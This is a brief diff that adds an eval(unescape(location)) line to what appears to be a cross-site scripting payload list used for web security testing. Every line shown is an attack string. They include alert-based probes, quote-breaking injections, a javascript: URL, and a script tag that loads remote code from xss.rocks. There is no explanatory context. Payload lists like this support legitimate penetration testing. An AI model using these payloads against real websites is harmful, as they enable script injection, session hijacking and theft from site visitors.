@@ -39,3 +39,4 @@ alert\\`1\\`
 \";alert('XSS');//
 <SCRIPT SRC="http:&#47;&#47;xss.rocks/xss.jpg"></SCRIPT>
 javascript:alert%28/xss/%29
+";eval(unescape(location))//#  %0Aalert(0) 
